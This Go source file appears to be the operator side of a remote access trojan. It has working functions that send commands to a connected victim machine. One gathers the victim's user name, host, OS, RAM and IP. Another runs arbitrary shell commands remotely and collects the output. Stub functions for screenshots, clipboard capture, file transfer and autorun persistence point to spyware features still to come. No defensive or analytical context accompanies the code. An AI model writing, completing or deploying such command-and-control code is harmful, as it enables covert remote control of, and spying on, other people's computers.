package main

import (
	"fmt"
	"strings"
	"time"
)

func sendInfoCommand(client *Client) {
	client.conn.Write([]byte("INFO\n"))
	select {
	case resp := <-client.respChan:
		parts := strings.Split(resp, "|")
		if len(parts) == 5 {
			fmt.Printf("INFO from client:\n User: %s\n Host: %s\n OS: %s\n RAM: %s\n IP: %s\n",
				parts[0], parts[1], parts[2], parts[3], parts[4])
		} else {
			fmt.Println("INFO from client (raw):", resp)
		}
	case <-time.After(5 * time.Second):
		fmt.Println("No response from client.")
	}
}

func sendExecCommand(client *Client, cmdStr string) {
	client.conn.Write([]byte("EXEC:" + cmdStr + "\n"))

	resp := ""
	timeout := time.After(15 * time.Second)

collectLoop:
	for {
		select {
		case line := <-client.respChan:
			if strings.HasSuffix(line, "<END>") {
				resp += strings.TrimSuffix(line, "<END>")
				break collectLoop
			}
			resp += line + "\n"
		case <-timeout:
			fmt.Println("No response from client.")
			break collectLoop
		}
	}

	if resp == "" {
		fmt.Println("EXEC output: (no output)")
	} else {
		fmt.Println("EXEC output:\n" + resp)
	}
}

// placeholders for future features
func sendScreenshotCommand(client *Client)   {}
func sendClipboardCommand(client *Client)    {}
func sendFileTransferCommand(client *Client) {}
func sendAutorunCommand(client *Client)      {}
